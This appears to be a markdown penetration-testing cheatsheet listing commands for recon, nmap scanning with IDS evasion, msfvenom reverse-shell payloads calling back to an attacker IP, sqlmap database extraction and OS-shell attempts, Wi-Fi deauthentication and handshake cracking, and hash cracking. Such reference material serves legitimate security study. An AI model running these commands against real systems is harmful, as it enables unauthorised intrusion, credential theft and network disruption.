![Header Image](https://images.unsplash.com/photo-1558494949-ef010cbdcc31?w=800&h=200&fit=crop)

# 🛠️ Master Tools Cheatsheet

[⬅️ Tools & References Home](Home.md)

---

## 📋 Table of Contents
1. [Reconnaissance & OSINT](#1-reconnaissance--osint)
2. [Network Scanning](#2-network-scanning)
3. [Vulnerability Analysis](#3-vulnerability-analysis)
4. [System Hacking](#4-system-hacking)
5. [Web Application & SQL Injection](#5-web-application--sql-injection)
6. [Wireless Hacking](#6-wireless-hacking)
7. [Mobile, IoT & Cloud](#7-mobile-iot--cloud)
8. [Cryptography & Hash Cracking](#8-cryptography--hash-cracking)

---

## 1. Reconnaissance & OSINT

### `whois`
Obtain registration info for domains.
```bash
/usr/bin/whois target.com
```

### `dig`
Perform DNS queries and check for zone transfers.
```bash
# Query any record type
/usr/bin/dig target.com ANY

# Zone transfer request (AXFR)
/usr/bin/dig @ns1.target.com target.com AXFR
```

### `theHarvester`
Harvest emails, hostnames, and subdomains from public sources.
```bash
/usr/bin/theHarvester -d target.com -b google,bing,crtsh -f output.html
```

### `amass`
Perform active or passive subdomain enumeration.
```bash
# Passive subdomain recon
/usr/local/bin/amass enum -passive -d target.com
```

---

## 2. Network Scanning

### `nmap`
Network discovery and vulnerability scanning.
```bash
# Stealth SYN scan (TCP)
/usr/bin/nmap -sS -T4 target.com

# Service version detection and OS fingerprinting
/usr/bin/nmap -sV -O target.com

# Fragment packets (IDS/firewall evasion)
/usr/bin/nmap -f target.com

# Running default vulnerabilities scripts (NSE)
/usr/bin/nmap -sC --script vuln target.com
```

---

## 3. Vulnerability Analysis

### `nikto`
Scan web servers for outdated software and dangerous configs.
```bash
/usr/bin/nikto -h http://target.com
```

---

## 4. System Hacking

### `msfvenom`
Payload generator.
```bash
# Linux reverse shell payload (ELF binary)
/usr/bin/msfvenom -p linux/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f elf > shell.elf

# Windows reverse shell payload (EXE binary)
/usr/bin/msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=4444 -f exe > shell.exe
```

---

## 5. Web Application & SQL Injection

### `gobuster`
Brute-force directories, files, and DNS subdomains.
```bash
# Directory discovery
/usr/bin/gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
```

### `sqlmap`
Automate detection and exploitation of SQL injection vulnerabilities.
```bash
# Automatic vulnerability check
/usr/bin/sqlmap -u "http://target.com/item.php?id=1" --batch

# Extract database tables
/usr/bin/sqlmap -u "http://target.com/item.php?id=1" --tables --batch

# Attempt to obtain an OS shell
/usr/bin/sqlmap -u "http://target.com/item.php?id=1" --os-shell
```

---

## 6. Wireless Hacking

### `aircrack-ng` Suite
Wi-Fi auditing tools.
```bash
# Start monitor mode
sudo /usr/sbin/airmon-ng start wlan0

# Sniff packets and capture handshake
sudo /usr/bin/airodump-ng -w capture_file --channel 6 wlan0mon

# Send deauthentication frames to disconnect clients
sudo /usr/bin/aireplay-ng -0 10 -a <AP_MAC> -c <CLIENT_MAC> wlan0mon

# Crack captured handshake offline using wordlist
/usr/bin/aircrack-ng -w wordlist.txt capture_file.cap
```

---

## 7. Mobile, IoT & Cloud

### `apktool`
Decompile and rebuild Android APKs.
```bash
# Decompile APK
/usr/bin/apktool d target_app.apk -o decompiled_out/
```

### `binwalk`
Extract filesystems from firmware binary images.
```bash
/usr/bin/binwalk -e firmware.bin
```

### `pacu`
AWS exploitation framework.
```bash
# Start pacu console
python3 pacu.py
```

---

## 8. Cryptography & Hash Cracking

### `hashcat`
GPU-accelerated hash cracker.
```bash
# Crack MD5 hashes (Mode 0) using wordlist
/usr/bin/hashcat -m 0 hash.txt wordlist.txt

# Crack SHA-256 hashes (Mode 1400)
/usr/bin/hashcat -m 1400 hash.txt wordlist.txt
```

### `john`
CPU-based hash cracker.
```bash
/usr/bin/john --wordlist=wordlist.txt hash.txt
```

---

[⬅️ Tools & References Home](Home.md)
